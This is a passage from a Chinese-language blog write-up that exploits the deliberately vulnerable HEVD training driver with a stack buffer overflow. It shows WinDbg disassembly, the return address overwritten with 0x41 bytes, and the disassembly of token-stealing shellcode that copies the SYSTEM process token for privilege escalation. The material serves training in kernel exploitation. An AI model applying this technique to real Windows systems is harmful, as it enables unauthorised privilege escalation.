</span></span><span class="line"><span class="cl"><span class="nf">ad3351d8</span> <span class="no">ff7508</span>          <span class="no">push</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351db</span> <span class="mi">68</span><span class="no">ee7433ad</span>      <span class="no">push</span>    <span class="no">offset</span> <span class="no">HEVD</span><span class="p">!</span> <span class="err">??</span> <span class="p">::</span><span class="no">NNGAKEGL</span><span class="p">::</span><span class="err">`</span><span class="no">string</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">ad3374ee</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351e0</span> <span class="mi">6</span><span class="no">a03</span>            <span class="no">push</span>    <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351e2</span> <span class="mi">6</span><span class="no">a4d</span>            <span class="no">push</span>    <span class="mi">4</span><span class="no">Dh</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351e4</span> <span class="mi">5</span><span class="no">b</span>              <span class="no">pop</span>     <span class="no">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351e5</span> <span class="mi">53</span>              <span class="no">push</span>    <span class="no">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351e6</span> <span class="mi">8</span><span class="no">b3504202fad</span>    <span class="no">mov</span>     <span class="no">esi</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">HEVD</span><span class="p">!</span><span class="no">_imp__DbgPrintEx</span> <span class="p">(</span><span class="no">ad2f2004</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351ec</span> <span class="no">ffd6</span>            <span class="no">call</span>    <span class="no">esi</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351ee</span> <span class="no">ff750c</span>          <span class="no">push</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="mi">0</span><span class="no">Ch</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351f1</span> <span class="mi">68047533</span><span class="no">ad</span>      <span class="no">push</span>    <span class="no">offset</span> <span class="no">HEVD</span><span class="p">!</span> <span class="err">??</span> <span class="p">::</span><span class="no">NNGAKEGL</span><span class="p">::</span><span class="err">`</span><span class="no">string</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">ad337504</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351f6</span> <span class="mi">6</span><span class="no">a03</span>            <span class="no">push</span>    <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351f8</span> <span class="mi">53</span>              <span class="no">push</span>    <span class="no">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351f9</span> <span class="no">ffd6</span>            <span class="no">call</span>    <span class="no">esi</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351fb</span> <span class="mi">8</span><span class="no">d85e4f7ffff</span>    <span class="no">lea</span>     <span class="no">eax</span><span class="p">,[</span><span class="no">ebp-81Ch</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335201</span> <span class="mi">50</span>              <span class="no">push</span>    <span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335202</span> <span class="mi">68207533</span><span class="no">ad</span>      <span class="no">push</span>    <span class="no">offset</span> <span class="no">HEVD</span><span class="p">!</span> <span class="err">??</span> <span class="p">::</span><span class="no">NNGAKEGL</span><span class="p">::</span><span class="err">`</span><span class="no">string</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">ad337520</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335207</span> <span class="mi">6</span><span class="no">a03</span>            <span class="no">push</span>    <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335209</span> <span class="mi">53</span>              <span class="no">push</span>    <span class="no">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33520a</span> <span class="no">ffd6</span>            <span class="no">call</span>    <span class="no">esi</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33520c</span> <span class="mi">6800080000</span>      <span class="no">push</span>    <span class="mi">800</span><span class="no">h</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335211</span> <span class="mi">68387533</span><span class="no">ad</span>      <span class="no">push</span>    <span class="no">offset</span> <span class="no">HEVD</span><span class="p">!</span> <span class="err">??</span> <span class="p">::</span><span class="no">NNGAKEGL</span><span class="p">::</span><span class="err">`</span><span class="no">string</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">ad337538</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335216</span> <span class="mi">6</span><span class="no">a03</span>            <span class="no">push</span>    <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335218</span> <span class="mi">53</span>              <span class="no">push</span>    <span class="no">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335219</span> <span class="no">ffd6</span>            <span class="no">call</span>    <span class="no">esi</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33521b</span> <span class="mi">83</span><span class="no">c440</span>          <span class="no">add</span>     <span class="no">esp</span><span class="p">,</span><span class="mi">40</span><span class="no">h</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33521e</span> <span class="mi">68167633</span><span class="no">ad</span>      <span class="no">push</span>    <span class="no">offset</span> <span class="no">HEVD</span><span class="p">!</span> <span class="err">??</span> <span class="p">::</span><span class="no">NNGAKEGL</span><span class="p">::</span><span class="err">`</span><span class="no">string</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">ad337616</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335223</span> <span class="mi">6</span><span class="no">a03</span>            <span class="no">push</span>    <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335225</span> <span class="mi">53</span>              <span class="no">push</span>    <span class="no">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335226</span> <span class="no">ffd6</span>            <span class="no">call</span>    <span class="no">esi</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335228</span> <span class="no">ff750c</span>          <span class="no">push</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="mi">0</span><span class="no">Ch</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33522b</span> <span class="no">ff7508</span>          <span class="no">push</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33522e</span> <span class="mi">8</span><span class="no">d85e4f7ffff</span>    <span class="no">lea</span>     <span class="no">eax</span><span class="p">,[</span><span class="no">ebp-81Ch</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335234</span> <span class="mi">50</span>              <span class="no">push</span>    <span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335235</span> <span class="no">e8a2bffbff</span>      <span class="no">call</span>    <span class="no">HEVD</span><span class="p">!</span><span class="no">memcpy</span> <span class="p">(</span><span class="no">ad2f11dc</span><span class="p">)</span><span class="c1">//为溢出函数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">ad33523a</span> <span class="mi">83</span><span class="no">c418</span>          <span class="no">add</span>     <span class="no">esp</span><span class="p">,</span><span class="mi">18</span><span class="no">h</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33523d</span> <span class="no">eb27</span>            <span class="no">jmp</span>     <span class="no">HEVD</span><span class="p">!</span><span class="no">TriggerBufferOverflowStack</span><span class="err">+</span><span class="mi">0xc4</span> <span class="p">(</span><span class="no">ad335266</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33523f</span> <span class="mi">8</span><span class="no">b45ec</span>          <span class="no">mov</span>     <span class="no">eax</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp-14h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335242</span> <span class="mi">8</span><span class="no">b00</span>            <span class="no">mov</span>     <span class="no">eax</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">eax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335244</span> <span class="mi">8</span><span class="no">b00</span>            <span class="no">mov</span>     <span class="no">eax</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">eax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335246</span> <span class="mi">8945</span><span class="no">e4</span>          <span class="no">mov</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp-1Ch</span><span class="p">],</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335249</span> <span class="mi">33</span><span class="no">c0</span>            <span class="no">xor</span>     <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33524b</span> <span class="mi">40</span>              <span class="no">inc</span>     <span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33524c</span> <span class="no">c3</span>              <span class="no">ret</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33524d</span> <span class="mi">8</span><span class="no">b65e8</span>          <span class="no">mov</span>     <span class="no">esp</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp-18h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335250</span> <span class="mi">8</span><span class="no">b7de4</span>          <span class="no">mov</span>     <span class="no">edi</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp-1Ch</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335253</span> <span class="mi">57</span>              <span class="no">push</span>    <span class="no">edi</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335254</span> <span class="mi">68</span><span class="no">f07233ad</span>      <span class="no">push</span>    <span class="no">offset</span> <span class="no">HEVD</span><span class="p">!</span> <span class="err">??</span> <span class="p">::</span><span class="no">NNGAKEGL</span><span class="p">::</span><span class="err">`</span><span class="no">string</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">ad3372f0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335259</span> <span class="mi">6</span><span class="no">a03</span>            <span class="no">push</span>    <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33525b</span> <span class="mi">6</span><span class="no">a4d</span>            <span class="no">push</span>    <span class="mi">4</span><span class="no">Dh</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33525d</span> <span class="no">ff1504202fad</span>    <span class="no">call</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">HEVD</span><span class="p">!</span><span class="no">_imp__DbgPrintEx</span> <span class="p">(</span><span class="no">ad2f2004</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335263</span> <span class="mi">83</span><span class="no">c410</span>          <span class="no">add</span>     <span class="no">esp</span><span class="p">,</span><span class="mi">10</span><span class="no">h</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335266</span> <span class="no">c745fcfeffffff</span>  <span class="no">mov</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp-4</span><span class="p">],</span><span class="mi">0</span><span class="no">FFFFFFFEh</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33526d</span> <span class="mi">8</span><span class="no">bc7</span>            <span class="no">mov</span>     <span class="no">eax</span><span class="p">,</span><span class="no">edi</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33526f</span> <span class="mi">8</span><span class="no">b4df0</span>          <span class="no">mov</span>     <span class="no">ecx</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp-10h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335272</span> <span class="mi">64890</span><span class="no">d00000000</span>  <span class="no">mov</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="no">fs</span><span class="p">:[</span><span class="mi">0</span><span class="p">],</span><span class="no">ecx</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335279</span> <span class="mi">59</span>              <span class="no">pop</span>     <span class="no">ecx</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33527a</span> <span class="mi">5</span><span class="no">f</span>              <span class="no">pop</span>     <span class="no">edi</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33527b</span> <span class="mi">5</span><span class="no">e</span>              <span class="no">pop</span>     <span class="no">esi</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33527c</span> <span class="mi">5</span><span class="no">b</span>              <span class="no">pop</span>     <span class="no">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33527d</span> <span class="no">c9</span>              <span class="no">leave</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad33527e</span> <span class="no">c20800</span>          <span class="no">ret</span>     <span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335281</span> <span class="no">cc</span>              <span class="no">int</span>     <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335282</span> <span class="mi">55</span>              <span class="no">push</span>    <span class="no">ebp</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad335283</span> <span class="mi">8</span><span class="no">bec</span>            <span class="no">mov</span>     <span class="no">ebp</span><span class="p">,</span><span class="no">esp</span></span></span></code></pre></div><p><code>ad335235</code>的<code>call    HEVD!memcpy (ad2f11dc)</code>是溢出发生的函数</p>
<p>下断点之后运行：</p>
<pre tabindex="0"><code>bp ad335235
g</code></pre><p><img loading="lazy" src="/posts/2023-8-hevd/image-20230813000610281.png" alt="image-20230813000610281" srcset="/posts/2023-8-hevd/image-20230813000610281.png?size=small, /posts/2023-8-hevd/image-20230813000610281.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230813000610281.png?size=large 2x" data-title="image-20230813000610281" style="--width: 996px;--aspect-ratio: 996 / 690;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>看此时的ebp</p>
<p><code>aadb7ab0</code>-&gt;<code>aadb7ac0</code>-&gt;<code>aadb7adc</code>-&gt;<code>00000000</code></p>
<p>这里ebp实际为<code>aadb7adc</code></p>
<pre tabindex="0"><code>kd&gt; dd ebp
aadb7ab0  aadb7ac0 ad33519a 002cf2ac 00000824
aadb7ac0  aadb7adc ad3340ba 87561850 875618c0
aadb7ad0  85b68f80 87785818 00000000 aadb7af4
aadb7ae0  83e87f87 87785818 87561850 87561850
aadb7af0  87785818 aadb7b14 84085eec 00000000
aadb7b00  87561850 875618c0 00000094 04db7bac
aadb7b10  aadb7b24 aadb7bd0 840892a8 87785818</code></pre><p>单步步过p</p>
<div class="highlight" id="id-20"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">kd&gt; p
</span></span><span class="line"><span class="cl">HEVD!TriggerBufferOverflowStack+0x98:
</span></span><span class="line"><span class="cl">ad33523a 83c418          add     esp,18h</span></span></code></pre></div><p>查看esp和ebp：</p>
<div class="highlight" id="id-21"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">kd&gt; dd esp
</span></span><span class="line"><span class="cl">aadb726c  aadb7294 002cf2ac <span class="m">00000824</span> 0000004d
</span></span><span class="line"><span class="cl">aadb727c  <span class="m">00000003</span> ad337616 576f491a <span class="m">87561850</span>
</span></span><span class="line"><span class="cl">aadb728c  83f1617c 875618c0 <span class="m">41414141</span> <span class="m">41414141</span>
</span></span><span class="line"><span class="cl">aadb729c  <span class="m">41414141</span> <span class="m">41414141</span> <span class="m">41414141</span> <span class="m">41414141</span>
</span></span><span class="line"><span class="cl">aadb72ac  <span class="m">41414141</span> <span class="m">41414141</span> <span class="m">41414141</span> <span class="m">41414141</span>
</span></span><span class="line"><span class="cl">aadb72bc  <span class="m">41414141</span> <span class="m">41414141</span> <span class="m">41414141</span> <span class="m">41414141</span>
</span></span><span class="line"><span class="cl">aadb72cc  <span class="m">41414141</span> <span class="m">41414141</span> <span class="m">41414141</span> <span class="m">41414141</span>
</span></span><span class="line"><span class="cl">aadb72dc  <span class="m">41414141</span> <span class="m">41414141</span> <span class="m">41414141</span> <span class="m">41414141</span>
</span></span><span class="line"><span class="cl">kd&gt; dd ebp
</span></span><span class="line"><span class="cl">aadb7ab0  <span class="m">41414141</span> 013b1040 002cf2ac <span class="m">00000824</span>
</span></span><span class="line"><span class="cl">aadb7ac0  aadb7adc ad3340ba <span class="m">87561850</span> 875618c0
</span></span><span class="line"><span class="cl">aadb7ad0  85b68f80 <span class="m">87785818</span> <span class="m">00000000</span> aadb7af4
</span></span><span class="line"><span class="cl">aadb7ae0  83e87f87 <span class="m">87785818</span> <span class="m">87561850</span> <span class="m">87561850</span>
</span></span><span class="line"><span class="cl">aadb7af0  <span class="m">87785818</span> aadb7b14 84085eec <span class="m">00000000</span>
</span></span><span class="line"><span class="cl">aadb7b00  <span class="m">87561850</span> 875618c0 <span class="m">00000094</span> 04db7bac
</span></span><span class="line"><span class="cl">aadb7b10  aadb7b24 aadb7bd0 840892a8 <span class="m">87785818</span>
</span></span><span class="line"><span class="cl">aadb7b20  85b68f80 <span class="m">00000000</span> <span class="m">00000101</span> <span class="m">00025900</span></span></span></code></pre></div><p>可以看到压入的数据已经覆盖到了ebp的地址，然后改写ret地址为shellcode地址</p>
<div class="highlight" id="id-22"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">kd</span><span class="err">&gt;</span> <span class="no">u</span> <span class="mi">013</span><span class="no">b1040</span> 
</span></span><span class="line"><span class="cl"><span class="mi">013</span><span class="no">b1040</span> <span class="mi">53</span>              <span class="no">push</span>    <span class="no">ebx</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1041</span> <span class="mi">56</span>              <span class="no">push</span>    <span class="no">esi</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1042</span> <span class="mi">57</span>              <span class="no">push</span>    <span class="no">edi</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1043</span> <span class="mi">60</span>              <span class="no">pushad</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1044</span> <span class="mi">33</span><span class="no">c0</span>            <span class="no">xor</span>     <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1046</span> <span class="mi">648</span><span class="no">b8024010000</span>  <span class="no">mov</span>     <span class="no">eax</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="no">fs</span><span class="p">:[</span><span class="no">eax</span><span class="err">+</span><span class="mi">124</span><span class="no">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b104d</span> <span class="mi">8</span><span class="no">b4050</span>          <span class="no">mov</span>     <span class="no">eax</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">eax</span><span class="err">+</span><span class="mi">50</span><span class="no">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1050</span> <span class="mi">8</span><span class="no">bc8</span>            <span class="no">mov</span>     <span class="no">ecx</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="nf">kd</span><span class="err">&gt;</span> <span class="no">u</span> <span class="mi">013</span><span class="no">b1040</span> <span class="no">L20</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1040</span> <span class="mi">53</span>              <span class="no">push</span>    <span class="no">ebx</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1041</span> <span class="mi">56</span>              <span class="no">push</span>    <span class="no">esi</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1042</span> <span class="mi">57</span>              <span class="no">push</span>    <span class="no">edi</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1043</span> <span class="mi">60</span>              <span class="no">pushad</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1044</span> <span class="mi">33</span><span class="no">c0</span>            <span class="no">xor</span>     <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1046</span> <span class="mi">648</span><span class="no">b8024010000</span>  <span class="no">mov</span>     <span class="no">eax</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="no">fs</span><span class="p">:[</span><span class="no">eax</span><span class="err">+</span><span class="mi">124</span><span class="no">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b104d</span> <span class="mi">8</span><span class="no">b4050</span>          <span class="no">mov</span>     <span class="no">eax</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">eax</span><span class="err">+</span><span class="mi">50</span><span class="no">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1050</span> <span class="mi">8</span><span class="no">bc8</span>            <span class="no">mov</span>     <span class="no">ecx</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1052</span> <span class="no">ba04000000</span>      <span class="no">mov</span>     <span class="no">edx</span><span class="p">,</span><span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1057</span> <span class="mi">8</span><span class="no">b80b8000000</span>    <span class="no">mov</span>     <span class="no">eax</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">eax</span><span class="err">+</span><span class="mi">0</span><span class="no">B8h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b105d</span> <span class="mi">2</span><span class="no">db8000000</span>      <span class="no">sub</span>     <span class="no">eax</span><span class="p">,</span><span class="mi">0</span><span class="no">B8h</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1062</span> <span class="mi">3990</span><span class="no">b4000000</span>    <span class="no">cmp</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">eax</span><span class="err">+</span><span class="mi">0</span><span class="no">B4h</span><span class="p">],</span><span class="no">edx</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1068</span> <span class="mi">75</span><span class="no">ed</span>            <span class="no">jne</span>     <span class="mi">013</span><span class="no">b1057</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b106a</span> <span class="mi">8</span><span class="no">b90f8000000</span>    <span class="no">mov</span>     <span class="no">edx</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">eax</span><span class="err">+</span><span class="mi">0</span><span class="no">F8h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1070</span> <span class="mi">8991</span><span class="no">f8000000</span>    <span class="no">mov</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ecx</span><span class="err">+</span><span class="mi">0</span><span class="no">F8h</span><span class="p">],</span><span class="no">edx</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1076</span> <span class="mi">61</span>              <span class="no">popad</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1077</span> <span class="mi">33</span><span class="no">c0</span>            <span class="no">xor</span>     <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1079</span> <span class="mi">83</span><span class="no">c40c</span>          <span class="no">add</span>     <span class="no">esp</span><span class="p">,</span><span class="mi">0</span><span class="no">Ch</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b107c</span> <span class="mi">5</span><span class="no">d</span>              <span class="no">pop</span>     <span class="no">ebp</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b107d</span> <span class="no">c20800</span>          <span class="no">ret</span>     <span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1080</span> <span class="mi">5</span><span class="no">f</span>              <span class="no">pop</span>     <span class="no">edi</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1081</span> <span class="mi">5</span><span class="no">e</span>              <span class="no">pop</span>     <span class="no">esi</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1082</span> <span class="mi">5</span><span class="no">b</span>              <span class="no">pop</span>     <span class="no">ebx</span>
</span></span><span class="line"><span class="cl"><span class="err">013</span><span class="nf">b1083</span> <span class="no">c3</span>              <span class="no">ret</span></span></span></code></pre></div><p>继续执行，当<code>ad33527e c20800          ret     8</code>执行完后，就去执行shellcode了：</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230813001528633.png" alt="image-20230813001528633" srcset="/posts/2023-8-hevd/image-20230813001528633.png?size=small, /posts/2023-8-hevd/image-20230813001528633.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230813001528633.png?size=large 2x" data-title="image-20230813001528633" style="--width: 1081px;--aspect-ratio: 1081 / 435;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><code>pop ebp</code>对堆栈进行平衡后的<code>ebp</code>：已还原</p>
<pre tabindex="0"><code>kd&gt; dd ebp
aadb7adc  aadb7af4 83e87f87 87785818 87561850
aadb7aec  87561850 87785818 aadb7b14 84085eec
aadb7afc  00000000 87561850 875618c0 00000094
aadb7b0c  04db7bac aadb7b24 aadb7bd0 840892a8
aadb7b1c  87785818 85b68f80 00000000 00000101
aadb7b2c  00025900 00000002 92412bc0 0000001c
aadb7b3c  002cf1cc 840d07a9 95b108bc 00000000
aadb7b4c  95b10850 aadb7bb4 00000000 0012019f</code></pre><h3 id="shellcode分析" class="heading-element">
  <a href="#shellcode%e5%88%86%e6%9e%90" class="heading-mark"></a>shellcode分析</h3><p>查看所有进程<code>EPROCESS</code>首地址：</p>
<div class="highlight" id="id-24"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">!dml_proc</span></span></code></pre></div><p>查看凭证：</p>
<p>进程Token在<code>EPROCESS</code>结构体偏移<code>0xF8</code></p>
<div class="highlight" id="id-25"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">_EPROCESS</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="n">VOID</span><span class="o">*</span> <span class="n">UniqueProcessId</span><span class="p">;</span>                                                  <span class="c1">//0xb4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">_EX_FAST_REF</span> <span class="n">Token</span><span class="p">;</span>                                              <span class="c1">//0xf8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">copy</span>
</span></span><span class="line"><span class="cl"><span class="c1">//0x4 bytes (sizeof)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">struct</span> <span class="n">_EX_FAST_REF</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">union</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">VOID</span><span class="o">*</span> <span class="n">Object</span><span class="p">;</span> <span class="c1">//0x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ULONG</span> <span class="nl">RefCnt</span><span class="p">:</span><span class="mi">3</span><span class="p">;</span> <span class="c1">//0x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">ULONG</span> <span class="n">Value</span><span class="p">;</span>  <span class="c1">//0x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span> 
</span></span></code></pre></div><p>这里使用<code>svchost.exe</code>作为示例：</p>
<ol>
<li>直接通过<code>!process</code>查看</li>
</ol>
<pre tabindex="0"><code>kd&gt; !process 0 0
PROCESS 8664ba58  SessionId: 0  Cid: 0d08    Peb: 7ffda000  ParentCid: 01fc
    DirBase: 3ebc44e0  ObjectTable: 89b87328  HandleCount: 313.
    Image: svchost.exe
kd&gt; !process 8664ba58  
PROCESS 8664ba58  SessionId: 0  Cid: 0d08    Peb: 7ffda000  ParentCid: 01fc
    DirBase: 3ebc44e0  ObjectTable: 89b87328  HandleCount: 313.
    Image: svchost.exe
    VadRoot 87864f18 Vads 106 Clone 0 Private 468. Modified 92. Locked 0.
    DeviceMap 89006880
    Token                             898fcc78
